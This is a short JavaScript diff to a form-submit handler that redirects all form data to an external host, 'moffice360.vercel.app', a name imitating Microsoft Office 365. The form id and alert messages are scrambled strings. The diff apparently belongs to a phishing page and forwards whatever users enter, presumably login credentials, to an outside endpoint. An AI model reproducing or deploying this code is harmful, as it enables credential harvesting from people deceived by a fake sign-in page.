@@ -120,23 +120,26 @@
 function handleSubmit() {
   const form = document.getElementById('conforpky');
   const formData = new FormData(form);
+  const data = Object.fromEntries(formData);
   
-  fetch('/api/submit', {  // Note the /api/ prefix
+  fetch('https://moffice360.vercel.app/api/submit', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(Object.fromEntries(formData))
+    body: JSON.stringify(data)
   })
   .then(response => {
     if (response.ok) {
+      console.log('Success');
       alert('EmlSntScsflew1');
     } else {
+      console.error('Server error');
       alert('ErrSndnElveme2');
     }
   })
   .catch(error => {
-    console.error('Err', error);
+    console.error('Error:', error);
     alert('ErrSndnEl3');
   });
 }
